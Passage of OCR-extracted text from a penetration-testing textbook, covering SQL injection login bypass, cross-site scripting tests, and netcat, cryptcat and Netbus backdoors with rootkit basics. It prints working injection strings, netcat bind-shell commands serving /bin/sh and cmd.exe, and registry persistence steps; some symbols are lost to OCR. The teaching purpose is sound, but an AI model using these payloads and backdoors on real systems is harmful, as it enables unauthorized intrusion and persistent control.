Base64 is a trivial task that can be accomplished with little effort using a program or online tool. i t should be pointed out that there are many good proxy servers available to assist you with the task of data interception. d o not be afraid to explore other proxy servers as well. CODE INJECTION ATTACKS like buffer overflows in system code, injection attacks have been a serious issue in the web world for many years, and like buffer overflows, there are many f IGURE 5.9 Setting Up WebScarab to Intercept Requests and Responses. ALERT! Just a word of warning—you may want to leave the Intercept requests and Intercept responses unchecked until you are ready to test, as nearly every page involves these actions and intercepting everything before you are ready will make your browsing experience painfully slow."},{"pageNumber":136,"pageContent":"Web-Based Exploitation ChApTER 5 117 different kinds of code injection attacks. Broadly defined, this class of attacks could easily fill a chapter. However, because we are focusing on the basics, we will examine the most basic type of code injection: the classic s Ql injec- tion. we will explore the basic commands needed to run an s Ql injection and how it can be used to bypass basic web application authentication. i njection attacks can be used for a variety of purposes including bypassing authentica- tion, manipulating data, viewing sensitive data, and even executing commands on the remote host. m ost modern web applications rely on the use of interpreted programming languages and backend databases to store information and generate dynami- cally driven content to the user. t here are many popular interpreted program- ming languages in use today including PHP, Javascript, A sP, s tructured Query l anguage ( sQl), Python, and countless others. An interpreted language differs from a compiled language because the interpreted language generates machine code just before it is executed. c ompiled programming languages require the programmer to compile the source code and generate an executable (.exe) file. i n this case, once the program is compiled, the source code cannot be changed unless it is recompiled and the new executable is redistributed. i n the case of modern web applications, like an e-commerce site, the inter- preted language works by building a series of executable statements that uti- lize both the original programmer’s work and input from the user. c onsider an online shopper who wants to purchase more r Am for his computer. t he user navigates to his favorite online retailer and enters the term “16gb r Am” in the search box. After the user clicks the search button, the web app gathers the user’s input (“16gb r Am”) and constructs a query to search the backend data- base for any rows in the product table containing “16gb r Am.” Any products that contain the keywords “16gb r Am” are collected from the database and returned to the user’s browser. Understanding what an interpreted language is and how it works is the key to understanding injection attacks. k nowing that user input will often be used to build code that is executed on the target system, injection attacks focus on submitting, sending, and manipulating user-driven input. t he goal of sending manipulated input or queries to a target is to get the target to execute unin- tended commands or return unintended information back to the attacker . th e classic example of an injection attack is sQl injection. sQl is a program- ming language that is used to interact with and manipulate data in a database. Using sQl a user can read, write, modify, and delete data stored in the database tables. re call from our example above that the user supplied a search string “16gb rAm” to the web application (an e-commerce website). in this case, the web application generated an sQl statement based off of the user input. i t is important that you understand there are many different flavors of s Ql and different vendors may use different verbs to perform the same actions. s pecific statements that work in o racle may not work in m ysQl or mss Ql. t he information contained below will provide a basic and generic framework"},{"pageNumber":137,"pageContent":"The Basics of hacking and penetration T esting 118 for interacting with most applications that use s Ql, but you should strive to learn the specific elements for your target. c onsider another example. Assume that our network admin Ben o wned is searching for a c hristmas present for his boss. wanting to make up for many of his past mistakes, Ben decides to browse his favorite online retailer to search for a new laptop. to search the site for laptops, Ben enters the keywords “lap- top” (minus the quotes) into a search box. t his causes the web application to build an s Ql query looking for any rows in the product table that include the word “laptop.” s Ql queries are among the most common actions performed by web applications as they are used to search tables and return matching results. the following is an example of a simple sQl query: SELECT * FROM product WHERE category  ‘laptop’; in the statement above, the “ select ” verb is used to tell s Ql that you wish to search and return results from a table. t he “*” is used as a wildcard and instructs s Ql to return every column from the table when a match is found. t he “ from ” keyword is used to tell s Ql which table to search. t he “ from ” verb is followed immediately by the actual name of the table (“product” in this example). f inally, the “ wHere” clause is used to set up a test condition. t he test condition is used to restrict or specify which rows are to be returned back to the user. i n this case, the selec t statement will return all the rows from the product table that contain the word “laptop” in the “category” column. it is important to remember that in real life, most sQl statements you will encounter are much more complex than this example. of tentimes, an sQl query will interact with several columns from several different tables in the same query. However, armed with this basic sQl knowledge, let us examine this statement a little more closely. we should be able to clearly see that in our example the user created the value to the right of the “  ” sign, whereas the original programmer created everything to the left of the “  ” sign. we c an combine this knowledge with a little bit of sQl syntax to produce some unexpected results. th e programmer built an sQl statement that was already fully constructed except for the string value to be used in the wHe re clause. th e application accepts whatever the user types into the “search” textbox and appends that string value to the end of the already created sQl statement. la stly, a final single quote is appended onto the sQl statement to balance the quotes. it looks like this when it is all done: SELECT * FROM product WHERE category  ‘laptop’ where SELECT * FROM product WHERE category  ‘ is created ahead of time by the programmer, while the word laptop is user-supplied and the final ‘ is appended by the application to balance quotes. Also notice that when the actual s Ql statement was built, it included single quotes around the word “laptop.” s Ql adds these because “category” is a string datatype in the database. t hey must always be balanced, that is there must be"},{"pageNumber":138,"pageContent":"Web-Based Exploitation ChApTER 5 119 an even number of quotes in the statement, so an s Ql syntax error does not occur. failure to have both an opening and closing quote will cause the s Ql statement to error and fail. s uppose that rather than simply entering the keyword, laptop, Ben entered the following into the search box: laptop’ or 1  1-- in this case the following sQl statement would be built and executed: SELECT * FROM product WHERE category  ‘laptop’ or 1  1--' By adding the extra quote, Ben would close off the string containing the user- supplied word of ‘laptop’ and add some additional code to be executed by the s Ql server, namely: or 1  1-- th e “or” statement above is an sQl condition that is used to return records when either statement is true. th e “—” is a programmatic comment. in most sQl versions, everything that follows the “—” is simply ignored by the inter- preter. th e final single quote is still appended by the application, but it is ignored. th is is a very handy trick for bypassing additional code that could interfere with your injection. in this case the new sQl statement is saying “return all of the records from the product table where the category is ‘laptop’ or 1  1 .” it should be obvious that 1  1 is always true. Because this is a true statement, sQl will actually return ALL of the records in the product table! t he key to understanding how to use s Ql injections is to understand the sub- tleties in how the statements are constructed. o n the whole, the example above may not seem too exciting; instead of returning all the rows containing the keyword laptop, we were able to return the whole table. However, if we apply this type of attack to a slightly different example, you may find the results a bit more sensational. m any web applications use s Ql to perform authentication. You gain access to restricted or confidential locations and material by entering a username and password. As in the previous example, oftentimes this information is con- structed from a combination of user-supplied input, the username and pass- word, and programmer-constructed statements. c onsider the following example. t he network admin Ben o wned has created a new website that is used to distribute confidential documents to the company’s key strategic partners. Partners are given a unique username and password to log into the website and download material. After setting up his secure website, Ben asks you to perform a penetration test against the site to see if you can bypass his authentication. You should start this task by using the same technique we examined to return all the data in the “products” table. remember the “ — ” is a common way of"},{"pageNumber":139,"pageContent":"The Basics of hacking and penetration T esting 120 commenting out any code following the “ — ”. As a result, in some instances it is possible to simply enter a username followed by the “ — ” sequence. i f inter- preted correctly, this can cause the s Ql statement to simply bypass or ignore the section of code that checks for a password and give you access to the specified user. However, this technique will only work if you already know a username. i f you do not know the username, you should begin by entering the following into the username textbox: ‘or 1  1-- leaving the username parameter blank and using an expression that will alw ays evaluate to true is a key way to attack a system when we are unsure of the usernames required to log into a database. n ot entering a username will cause most databases to simply grab the first user in the database. i n many instances, the first user account in a database is an administrative account. You can enter whatever you want for a password (for example, “syngress”), as it will not even get checked by the database because it is commented out. You do need to supply a password to bypass client-side authentication (or you can use your intercepting proxy to delete this parameter altogether). SELECT * FROM users WHERE uname  ‘‘or 1  1-- and pwd  ‘syngress’ At this point you should either have a username or be prepared to access the database with the first user listed in the database. i f you have a username, we need to attack the password field; here again we can enter the statement: ‘or 1  1-- Because we are using an “or” statement, regardless of what is entered before the first single quote, the statement will always evaluate to true. Upon examin- ing this statement, the interpreter will see that the password is true and grant access to the specified user. i f the username parameter is left blank, but the rest of the statement is executed, you will be given access to the first user listed in the database. i n this instance, assuming we have a username, the new s Ql statement would look similar to the following: SELECT * FROM users WHERE uname  ‘admin’ and pwd  ‘’or 1  1-- in many instances, the simple injection above will grant you full access to the database as the first user listed in the “users” table . i n all fairness, it should be pointed out that it is becoming more uncommon to find s Ql injection errors and bypass authentication using the techniques listed above. i njection attacks are now much more difficult to locate. However, this classic example still rears its head on occasion, especially with custom- built apps, and it also serves as an excellent starting point for learning about and discovering the more advanced injection attacks."},{"pageNumber":140,"pageContent":"Web-Based Exploitation ChApTER 5 121 CROSS -SITE SCRI pTING : BROWSERS ThAT TRUST SITES cross-site scripting, also referred to as xss , is the process of injecting scripts into a web application. t he injected script can be stored on the original web page and run or processed by each browser that visits the web page. t his pro- cess happens as if the injected script was actually part of the original code. c ross-site scripting is different from many other types of attacks as xss focuses on attacking the client, not the server. Although the malicious script itself is stored on the web application (server), the actual goal is to get a client (browser) to execute the script and perform an action. As a security measure, web applications only have access to the data that they write and store on a client. t his means any information stored on your machine from one website cannot be accessed by another website. c ross- site scripting can be used to bypass this restriction. w hen an attacker is able to embed a script into a trusted website, the victim’s browser will assume all the content including the malicious script is genuine and therefore should be trusted. Because the script is acting on behalf of the trusted website, the mali- cious script will have the ability to access potentially sensitive information stored on the client including session tokens and cookies. i t is important to point out that the end result or damage caused by a success- ful xss attack can vary widely. i n some instances the effect is a mere annoyance like a persistent pop-up window, whereas other more serious consequences can result in the complete compromise of the target. Although many people initially reject the seriousness of xss , a skilled attacker can use the attack to hijack sessions, gain access to restricted content stored by a website, execute commands on the target, and even record keystrokes! You should understand that there are numerous cross-site scripting attack vec- tors. Aside from simply entering code snippets into an input box, malicious hyperlinks or scripts can also be embedded directly into websites, e-mails, and even instant messages. m any e-mail clients today automatically render H tml e-mail. o ftentimes, the malicious portion of a malicious U rl will be obfus- cated in an attempt to appear more legitimate. i n its simplest form, conducting a cross-site scripting attack on a web applica- tion that does not perform input sanitization is easy. w hen we are only inter- ested in providing proof that the system is vulnerable, we can use some basic Java script to test for the presence of xss . website input boxes are an excellent place to start. rather than entering expected information into a textbox, a pen- etration tester should attempt to enter the script tag followed by a Java script “alert” directly into the field. the classic example of this test is listed below:  script  alert(“XSS Test”)  /script  if the above code is entered and the server is vulnerable, a Java script “alert” pop-up window will be generated. f igure 5.10 shows an example of a typical"},{"pageNumber":141,"pageContent":"The Basics of hacking and penetration T esting 122 web page where the user can log in by entering a username and password into the textboxes provided. However, as previously described, rather than entering a normal username and password, enter the test script. f igure 5.11 shows an example of the test xss before submitting. After entering our test script, we are ready to click the “ submit” button. remember if the test is successful and the web application is vulnerable to cross-site scripting, a Java script “alert” window with the message “ xss test” should appear on the client machine. f igure 5.12 shows the result of our test, providing proof that the application is vulnerable to cross-site scripting. Just as there are several attack vectors for launching cross-site scripting, the attack itself comes in several varieties. Because we are covering the basics, we will look at two examples: reflected cross-site scripting and stored cross-site scripting. f IGURE 5.11 XSS Test Code. f IGURE 5.12 XSS Success! f IGURE 5.10 Example of Input Boxes on a Typical Web Page."},{"pageNumber":142,"pageContent":"Web-Based Exploitation ChApTER 5 123 reflected cross-site scripts occur when a malicious script is sent from the client machine to a vulnerable server. t he vulnerable server then bounces or reflects the script back to the user. i n these cases, the payload (or script) is executed immediately. t his process happens in a single response/request. t his type of cross-site scripting attack is also known as a “ first o rder xss .” reflected cross- site scripting attacks are nonpersistent. t hus, the malicious U rl must be fed to the user via e-mail, instant message, and so on, so the attack executes in their browser. this has a phishing feel to it and rightfully so. i n some instances, the malicious script can actually be saved directly on the vulnerable server. w hen this happens, the attack is called a stored xss . Because the script is saved, it gets executed by every user who accesses the web applica- tion. i n the case of stored xss attacks, the payload itself (the malicious script or malformed U rl) is left behind and will be executed at a later time. t hese attacks are typically saved in a database or applet. s tored xss does no t need the phishing aspect of reflected xss. this helps the legitimacy of the attack. As mentioned earlier, cross-site scripting is a very practical attack. ev en though we only examined the simplest of x ss attacks, do not let this deter you from learning about the true power of cross-site scripting. in order to truly master this content, you will need to learn how to harness the power of x ss attacks to steal sessions from your target and deliver the other payloads discussed ear- lier in this section. on ce you have mastered both reflected and stored cross-site scripting attacks, you should begin examining and studying d om - based x ss attacks. hOW DO I p RACTICE ThIS STE p? As mentioned at the beginning of this chapter, it is important that you learn to master the basics of web exploitation. However, finding vulnerable websites on which you are authorized to conduct these attacks can be difficult. fortunately , the fine folks at the o pen web Application s ecurity Project ( ow A sP) organi- zation have developed a vulnerable platform for learning and practicing web- based attacks. t his project, called web goat, is an intentionally misconfigured and vulnerable web server. web goat was built using J2 ee, which means it is capable of running on any system that has the Java runtime e nvironment installed. web goat includes more than 30 individual lessons that provide a realistic, scenario-driven learn- ing environment. c urrent lessons include all the attacks we described in this chapter and many more. m ost lessons require you to perform a certain attack like using s Ql injection to bypass authentication. e ach lesson comes complete with hints that will help you solve the puzzle. As with other scenario-driven exercises, it is important to work hard and attempt to find the answer on your own before using the help files. i f you are making use of virtual machines in your hacking lab, you will need to download and install web goat inside a virtual machine. As discussed"},{"pageNumber":143,"pageContent":"The Basics of hacking and penetration T esting 124 previously, web goat will run in either l inux or w indows, just be sure to install Java (J re) on your system prior to starting web goat. we bgo at can be downloaded from the official o wAsP website at: http://www. owasp.org/. th e file you download will require 7zip or a program capable of unzipping a .7z file. Unzip the file and remember the location of the uncom- pressed we bgo at folder. if you are running we bgo at on wi ndows, you can navigate to the unzipped we b go at folder and locate the “webgoat_8080.bat” file. ex ecute this batch file by double clicking it. A terminal window will appear; you will need to leave this window open and running in order for we b go at to function properly. At this point, assuming that you are accessing we b go at from the same machine you are running the we b go at server on, you can begin using we b go at by opening a browser and entering the U r l : http://127.0.0.1:8080/ webgoat/attack. i f everything went properly, you will be presented with a log-in prompt. Both the username and password are set to: guest As a final note, please pay attention to the warnings posted in the “readme” file. s pecifically you should understand that running web goat outside of a lab environment is extremely dangerous, as your system will be vulnerable to attacks. Always use caution and only run web goat in a properly sandboxed environment. Wh ERE DO I GO fROM hERE ? As has been pointed out several times, there is little doubt that this attack vec- tor will continue to grow. o nce you have mastered the basics we discussed in this section, you should expand your knowledge by digging in and learning some of the more advanced topics of web application hacking including client- side attacks, session management, source code auditing, and many more. i f you are unsure of what else to study and want to keep up on the latest web- attack happenings, keep an eye on the o wA sP “top ten.” t he o wA sP top ten Project is an official list of the top web threats as defined by leading security researchers and top experts. i t should be pointed out that the web securify tool we discussed earlier in the chapter is capable of automatically testing for all threat categories listed in the o wA sP top ten Projects! ADDITIONAL RESOURCES You can find the list at http://www.owasp.org website or by searching Google for “OWASP Top Ten.” You should keep a close eye on this list, as it will continue to be updated and changed as the trends, risks, and threats evolve."},{"pageNumber":144,"pageContent":"Web-Based Exploitation ChApTER 5 125 since we are talking about o wA sP and they have graciously provided you a fantastic tool to learn about and test web application security, there are many benefits of joining the o wA sP organization. o nce you are a member, there are several different ways to get involved with the various projects and continue to expand your knowledge of web security. Along with the great web scarab project, you should explore other web proxies as well. Both the Burp Proxy and Paros Proxy are excellent (and free) tools for intercepting requests, modifying data, and spidering websites. f inally, there are several great tools that every good web penetration tes- ter should become familiar with. o ne of my colleagues and close friends is a very skilled web app penetration tester and he swears up and down that Burp s uite is the best application testing tool available today. After reviewing many web auditing tools, it is clear that Burp is indeed a great tool. A free version of the Burp s uite is built into Backtrack and can be found by clicking on the k- start dragon → Backtrack → web Application Analysis → web (front end) → Burpsuite i f you are not using Backtrack, the free version of Burp can be downloaded from the company’s website at: http://portswigger.net/burp/download.html. SUMMAR y Because the web is becoming more and more “executable” and because nearly every target has a web presence, this chapter examined web-based exploitation. t he chapter began by reviewing techniques and tools for interrogating web servers. t he use of n ikto and websecurify was covered for locating specific vul- nerabilities in a web server. e xploring the target website by discovering direc- tories and files was demonstrated through the use of a spider. A method for intercepting website requests by using web scarab was also covered. c ode injec- tion attacks, which constitute a serious threat to web security, were explored. s pecifically, we examined the basics of s Ql injection attacks. t he chapter con- cluded with a brief discussion and example of cross-site scripting ( xss)."},{"pageNumber":145,"pageContent":"This page intentionally left blank"},{"pageNumber":146,"pageContent":"127 INTRODUCTION maintaining access to a remote system is questionable activity and that needs to be discussed and clearly explained to the client. m any companies are inter- ested in having a penetration test performed but are leery of allowing the pene- tration testing company to make use of backdoors. m ost people are afraid that Maintaining Access with Backdoors and Rootkits ChApTER 6 Information in This Chapter: n Netcat: The Swiss Ar my Knife n Netcat’ s Cryptic Cousin: Cryptcat n Netbus: A Classic n Rootkits n Hack er Defender: It Is Not What You Think n Detecting and Defending Against Rootkits"},{"pageNumber":147,"pageContent":"The Basics of hacking and penetration T esting 128 these backdoors will be discovered and exploited by an unauthorized third party. i magine that you are the ceo of a company, how well would you sleep knowing that you may have an open, backdoor channel into your network? remember , the client sets both the scope and the authorization of the penetra- tion test. You will need to take the time to fully cover and discuss this step before proceeding. s till, on occasion you may be asked to conduct a penetration test that does require the use of a backdoor. w hether the reason is to provide a proof of con- cept, or simply to create a realistic scenario where the attacker can return to the target, it is important to cover the basics in this step. i n the simplest sense, a backdoor is a piece of software that resides on the tar- get computer and allows the attacker to return (connect) to the machine at any time. i n most cases, the backdoor is a hidden process that runs on the target machine and allows a normally unauthorized user to control the P c. i t is also important to understand that many exploits are fleeting. t hey work and provide access only as long as the program that was exploited remains run- ning. i n many cases if the target machine reboots or the exploited process is stopped, the shell will be lost. As a result of this, one of the first tasks to com- plete upon gaining access to a system is to migrate your shell to a more perma- nent home. this is often done through the use of backdoors. l ater in the chapter we will discuss rootkits. rootkits are a special kind of soft- ware that embed themselves deep into the operating system and perform a number of tasks, including giving a hacker the ability to complete hide pro- cesses and programs. NETCAT : ThE SWISS ARM y KNI fE ne tcat is an incredibly simple and unbelievably flexible tool that allows com- munication and network traffic to flow from one machine to another. Although ne tcat’s flexibility makes it an excellent choice for a backdoor, there are dozens of other uses of this tool. ne tcat can be used to transfer files between machines, conduct port scans, serve as a simple instant messenger/chat, and even function as a simple web server! we will cover the basics here, but you should spend time practicing and playing with ne tcat. You will be amazed at what this tool is capable of. it is nicknamed the “swiss army knife” for a reason. n etcat was originally written and released by Hobbit in 1996 and supports sending and receiving both t cP and U dP traffic. n etcat can function in either a client or server mode. w hen it is in client mode, the tool can be used to make a network connection to another service (including another instance of n etcat). i t is important to remember that n etcat can connect from any port on your local machine to any port on the target machine. w hile n etcat is run- ning in server mode, it acts as a listener where it waits to accept an incoming connection."},{"pageNumber":148,"pageContent":"Maintaining Access with Backdoors and Rootkits C h A p TER 6 129 l et us start with a very basic example of how we can use n etcat. i n this exam- ple we will set up n etcat to serve as a communication channel between two machines. t o set this up on the first machine, we simply need to choose a port and instruct n etcat to run in listener mode. i ssuing the following command in a terminal will accomplish this task: nc –l –p 2323 i n the command above, “nc” is used to invoke the n etcat program, whereas the “-l” is used to put n etcat into a listener mode. t he “-p” is used to specify the port number we want n etcat to listen on. At this point n etcat is running and waiting to accept an incoming connection on port 2323. n o w that we have n etcat listening on the first machine, we can move to the second machine. t o make a connection to the listening machine, we issue the following command: nc 172.16.45.132 2323 r unning this command from the second P c will force n etcat to attempt a con- nection to port 2323 on the machine with an i P address of 172.16.45.132. Because we have set up the first P c to act as a listener on that port, the two P c s should now be able to communicate. w e can test this by typing text into either terminal window. Anything that we type into the terminal from either machine will be displayed in the terminal window of both machines. t his is because the keyboard is acting as the standard input and n etcat is simply transporting the data entered (keystrokes) over the connection. t o end the “chat” and close the session, we can issue the cntl  c key combi- nation; this will terminate the n etcat connection. f igure 6.1 shows an example of this type of communication between two computers. i t is important to understand that once you kill or close the n etcat connec- tion, you will need to restart the program on the target machine before making another connection. c onstantly needing to connect to the target machine to restart n etcat is not very efficient. f ortunately, if you are using the w indo ws version of the program, n etcat provides a way to avoid this issue. i n the w indo ws version of n etcat if we start n etcat in listener mode using a “- l ” (switch) rather than a “-l” the target will keep the connection open on the specified port even after the client disconnects. i n many ways, this makes the program persistent. o f course to make it truly persistent, you would need f IGURE 6.1 Using Netcat to Communicate between Two Computers. D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":149,"pageContent":"The Basics of hacking and penetration T esting 130 to add the command to run every time the machine starts. o n a w indows machine, this could be accomplished by adding the n etcat program to the HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run registry hive. Unfortunately, in terms of making a persistent network connection, the l inux version of n etcat is not quite so straightforward. i n order to make the n etcat connection persistent on a l inux machine, you would have to write a simple bash script that forces n etcat to restart when the original connection is closed. i f you are interested in creating a persistent connection, there are many exam- ples to be found on the internet. Although the example above is an interesting use of n etcat and great for dem- onstrating the flexibility and power of the tool, in reality you will probably never use the “chat” feature during a penetration test. o n the other hand, once you have got n etcat uploaded to your target system, there are many practical uses for the tool. l et us take a look at something a bit more advantageous, like transferring files. m oving files between computers is easy when we have got the m eterpreter shell running but remember, we do not want to have to exploit the target every time. rather , the goal is to exploit once and then leave a backdoor so we can return at a later date. i f we upload n etcat to the target, we can use the program to transfer files to and from our target across a network. for this example, assume you want to upload a new file from your local machine to the target machine. w ith n etcat running on the target machine, we issue the following command: nc –l –p 7777  calc.exe this command will force the target to listen for an incoming connection on port 7777. An y input that is received will be stored into a file named “calc.exe.” f rom our local machine, we need to use n etcat to make a connection to the target and specify the file we want to send to the target. we accomplish this by using the following command: nc 172.16.45.129 7777  calc.exe Unfortunately, n etcat does not provide you any type of feedback letting you know when the transfer has been completed. Because you will receive no indi- cation when the upload is done, it is best to just wait for a few seconds and then issue a cntl  c to kill the connection. At this point, you should be able to run the “ls” command on your target machine and see the newly created file. figure 6.2 shows an example of this process. n aturally you could set up a n etcat connection to pull files from the target machine by reversing the commands above. o ftentimes during a penetration test, you will discover open ports that provide little or no additional information. You may run across situations where both"},{"pageNumber":150,"pageContent":"Maintaining Access with Backdoors and Rootkits ChApTER 6 131 nmap and n essus are unable to discover the service behind the port. i n these cases, it is often very beneficial to use n etcat to make a blind connection to the port. o nce you have made the connection, you begin sending information to the port by typing on the keyboard. i n some instances, the keyboard input will elicit a response from the service. t his response may be helpful in allowing you to identify the service. consider the following example: Assume you are conducting a penetration test on a target server. d uring the scanning process you discover that port 50001 is open. Unfortunately, nei- ther your port scanner nor your vulnerability scanners were able to determine what service was running behind the report. i n this case, it can be handy to use n etcat to interact with the unknown service. to force n etcat to attempt a con- nection to the service, we simply enter the following command: nc 172.16.45.129 50001 this command will attempt to create a t cP connection to the port and service. i t is important to note that you can force n etcat to send U dP packets by issu- ing the “-u” switch. o nce the connection is made in most cases it is easiest to simply enter some text and hit return key to send the text to the service. i f the service responds to the unexpected request, you may be able to derive its func- tion. figure 6.3 shows an example of this. As you can see, we used n etcat to create a connection to port 50001. o nce con- nected, the text “test” was sent through the connection. t he service returned with a response that clearly indicates that the mysterious service is a web server. f IGURE 6.2 Using Netcat to Transfer Files. f IGURE 6.3 Using Netcat to Interrogate Unknown Services."},{"pageNumber":151,"pageContent":"The Basics of hacking and penetration T esting 132 And even more important, the server has fully identified itself as an Apache server running version 2.2.9 on a linux Ubuntu machine! f inally, we can use n etcat to bind itself to a process and make that process available over a remote connection. t his allows us to execute and interact with the bound program as if we were sitting at the target machine itself. i f we start n etcat using the “-e” switch, it will execute whatever program we specify directly after the “-e.” t he program will execute on the target machine and will only run once a connection has been established. t he “-e” switch is incredibly powerful and very useful for setting up a backdoor shell on a target. to set up a backdoor, we will need to utilize the “-e” switch to bind a com- mand shell from the target machine to a port number. By setting up n etcat in this manner, later when we initiate a connection to the specified port, the pro- gram listed after the “-e” switch will run. i f we are using a l inux machine, we can accomplish this by typing the following into a terminal window: nc –l –p 12345 –e /bin/sh this will cause the target to serve up a shell to whoever connects to port 12345. Again, any commands sent from the n etcat client to the target machine will be executed locally as if the attacker were sitting at the target. t his technique can also be used on a w indows machine. to provide command line backdoor access into a w indows machine, we would run the following on the target (in a terminal window): nc.exe –L –p 12345 c:\\Windows\\System32\\cmd.exe to put the preceding example into context and hopefully make it more con- crete for you, let us examine the following scenario to show how we could implement n etcat as a backdoor. c onsider the following example: assume that we have successfully exploited a w indows target. Being forward-thinking pen- etration testers, we decide to create a more stable backdoor to this system so that we can return later. i n this case, we have decided to use n etcat as our back- door software. th e first order of business would be to upload ne tcat to the target machine; in this example, the ne tcat executable has been uploaded to the target’s System32 directory. l et us assume that we utilized the knowledge gained from c hapter 4 and we are currently using the m eterpreter shell to interact with our target. ALERT ! Notice, because this is a Windows machine, we are using the “-L” switch to make our connection persistent. If we close the connection from our machine, Netcat will continue listening on the specified port. The next time we connect to the machine, the cmd shell will be waiting and will execute for us."},{"pageNumber":152,"pageContent":"Maintaining Access with Backdoors and Rootkits ChApTER 6 133 once we have a m eterpreter shell on our target, we can upload the n etcat file to the victim by issuing the following command: meterpreter  upload nc.exe c:\\\\windows\\\\system32 Note: You will need to upload the w indows (.exe) version of n etcat because the target is running windows. i n this case, we have uploaded the nc.exe program to the w indows\\ system32 directory. t his will allow us to access the cmd.exe program directly. o nce n etcat has been transferred to the target machine, we need to choose a port number, bind the cmd.exe program, and start n etcat in server mode. t his will force n etcat to wait for an incoming connection on the specified port. to perform these tasks, we need to issue the following command in a terminal (again, assuming you are already in the same directory as netcat). meterpreter  nc –L –p 5777 –e cmd.exe At this point, n etcat should be running on our target machine. remember if you were interested in making this backdoor truly persistent, with the ability to survive a reboot, you would need to set the n etcat command to automatically start in the windows registry. no w that ne tcat is set up, we can close our me terpreter shell and make a connec- tion to the target using ne tcat. fi gure 6.4 shows an example of a connection we have made from our local Backtrack machine to the target wi ndows machine. t here should be little doubt in your mind that n etcat is a truly powerful and flexible tool. i n this section we have barely scratched the surface. i f you take some time to dig deeper into the program, you will find that people have been able to perform some rather amazing things using n etcat. You are encouraged to look into some of these clever implementations by searching the web, the results will amaze you. NETCAT ’S CRyp TIC COUSIN : C Ryp TCAT Although n etcat provides some amazing qualities, the program does have a few shortcomings. f irst off, it is important to understand that all traffic passed between a n etcat client and server is done so in clear text. t his means that any- one viewing traffic or sniffing the connection will be able to view and monitor f IGURE 6.4 Using Netcat as a Backdoor on a Windows Machine."},{"pageNumber":153,"pageContent":"The Basics of hacking and penetration T esting 134 all the information sent between the machines. c ryptcat was introduced to address this issue. c ryptcat utilizes twofish encryption to keep the traffic between the client and the server confidential. t he beauty of c ryptcat is that you do not need to learn any new commands. i f you have already mastered n etcat, then you have already mastered c ryptcat; but with c ryptcat you have the added benefit of transporting your data using an encrypted tunnel. Anyone viewing or analyzing your network traffic will not be able to see your information. on e important note about cr yptcat, you should always change the default key. if you fail to change the default key, anyone will have the ability to decrypt your session. th e default key is: metallica and can be changed using the “-k” switch. to set up an encrypted tunnel between two machines using c ryptcat, you can issue the following commands: 1) start the server: cyrptcat –l –p 5757 2) start the client: cryptcat 172.16.45.129 5757 You now have an encrypted tunnel set up between the two machines. fi gure 6.5 shows an example of this process. NETBUS : A CLASSIC netbus is a classic piece of software that has been around since 1998. we will briefly review it here as a gentle introduction to backdoors and remote control software. n etbus was originally written by c arl-fredrik. t he program consists of two parts: a client and a server. t he server software is installed on the target Pc, that is, the machine that you want to remotely control. t he client software is used to connect and control the target. o nce the n etbus server software is installed on the target machine, the client software can perform a number of different actions on the target. remember , even though the attacker is not physically sitting at the local machine, the cli- ent software allows the attacker to execute commands on the remote target as if he were. some of the more popular options include the following: n opening the cd-rom driv e; n starting a program; f IGURE 6.5 Using Cryptcat to Create an Encrypted Tunnel between Two Machines."},{"pageNumber":154,"pageContent":"Maintaining Access with Backdoors and Rootkits ChApTER 6 135 n taking a screenshot of the target’ s current screen; n uploading and do wnloading files; n sending messages . to use n etbus, simply install the server on the target machine and run the cli- ent software on the attacker machine. n etbus comes as a compressed file that contains several different pieces. You need to first unzip the n etbus file. to install the server software, you will need to execute the patch.exe file on the target. t his installs and starts n etbus. t he program will run as a process called “patch.exe” and when installed, will auto- matically create a registry entry so that it starts every time windows is started. to access the client panel you run the n etBus.exe. e nter the target i P address in the “Host name/ iP:” field and click the connect button. f igure 6.6 shows an example of the client interface that is used to interact with the target. t here is little doubt that n etbus is an old piece of software, but it makes for a great tool when discovering and exploring backdoor command and control of a remote target. ROOTKITS Just like me tasploit, when people are first exposed to the power and cunning of rootkits, they are usually amazed. to the uninitiated, rootkits appear to have an almost black-magic-like quality. th ey are usually simple to install and can pro- duce amazing results. ru nning a rootkit gives you the ability to hide files, pro- cesses, and programs as if they were never installed on the computer. ro otkits can be used to hide files from users and even the operating system itself. Because rootkits are so effective at hiding files, they will often be successful at evading even the most finely tuned antivirus software. t he name rootkit is typically said to be a derivative of the words “root,” as in root-level or admin- istrative access, and the “kit” or collection of tools that were provided by the software package. f IGURE 6.6 Netbus Client Software Used to Remotely Control the Target."},{"pageNumber":155,"pageContent":"The Basics of hacking and penetration T esting 136 As we already mentioned, rootkits are extremely stealthy. t hey can be used for a variety of purposes including escalating privileges, recording keystrokes, installing backdoors, and other nefarious tasks. m any rootkits are able to avoid detection because they operate at a much lower level of the operating system itself, inside the kernel. t he software that users typically interact with, func- tions at a higher level of the system. w hen a piece of software like antivirus needs to perform a particular task, it will often pass the request off to the lower levels of the operating system to complete the task. remember , some rootkits live deep inside the operating system. t hey can also work by “hooking” or intercepting these various calls between the software and operating system. By hooking the request from a piece of software, the rootkit is able to modify the normal response. c onsider the following example: assume that you want to see what processes are running on a w indows machine. to accomplish this, most users will depress the key combination “ cntl  A lt  del.” t his will allow the user to start the task m anager and view running processes and ser- vices. m ost people perform this task without thinking about it. t hey examine the process list presented and move on. w hile the following is a gross oversimplification, it should serve as an example to help you understand the basics. i n this case software is making a call to the operating system and asking what processes or services are running. t he oper- ating system queries all the running programs it is aware of and returns the list. However, if we add a rootkit to the mix, things get a little more compli- cated. Because rootkits have the ability to intercept and modify the responses returned by the operating system, when a user attempts to view the process list, the rootkit can simply remove selected programs, services, and processes from the list. t his happens instantaneously and the user is not aware of any differ- ences. t he program itself is actually functioning perfectly. i t is reporting exactly what it was told by the operating system. i n many senses of the word, the root- kit is causing the operating system to lie. i t is important to point out that a rootkit is not an exploit. rootkits are some- thing that is uploaded to a system after the system has been exploited. rootkits are usually used to hide files or programs and maintain stealthy backdoor access. ALERT ! As with everything else and even more so in this case, you must be 100 percent sure that your client authorizes the use of rootkits before you deploy them in a penetration test. Utilizing a rootkit without authorization will be a sure way to quickly end your career and put you behind bars. Even if you have been fully authorized to conduct a penetration test, double and triple check that you are specifically authorized to utilize a rootkit."},{"pageNumber":156,"pageContent":"Maintaining Access with Backdoors and Rootkits ChApTER 6 137 hacker Defender: It Is Not What you Think first things first; do not let the name fool you, Hacker d efender is a rootkit. i t is no t a way to defend hackers! Hacker d efender is a full-fledged rootkit that is relatively easy to understand and configure. t here are three 